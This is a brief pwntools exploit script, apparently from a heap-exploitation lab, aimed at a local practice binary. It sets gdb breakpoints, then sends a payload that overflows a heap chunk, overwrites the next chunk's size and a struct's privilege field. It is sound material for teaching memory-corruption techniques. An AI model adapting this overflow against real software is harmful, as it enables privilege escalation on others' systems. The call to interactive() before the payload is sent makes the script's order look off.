# -*- coding: utf-8 -*-

from pwn import *
import pwn
context(log_level = 'debug', os = 'linux')

filename = './heap_overflow'

p = process(filename)
elf = ELF(filename)

gdbscript = '''
alias src = context code
b heap_overflow.c:32
b heap_overflow.c:33
b heap_overflow.c:35
b heap_overflow.c:42
c
'''

'''
32 for msg = malloc(msgSize);
33 for info = malloc(sizeof(Info));
35 for strcpy(info->name, "User");
42 for check info->privilege
'''

gdb.attach(p, gdbscript = gdbscript)
p.interactive()

# input msg size
payload = pwn.flat([b'A' * (0x40 + 0x8), pwn.p64(0x21), b'User'.ljust(8, b'\x00'), b'\x02'.ljust(8, b'\x00')])
p.sendlineafter(b'input your msg size: \n', b'112')
p.sendline(payload)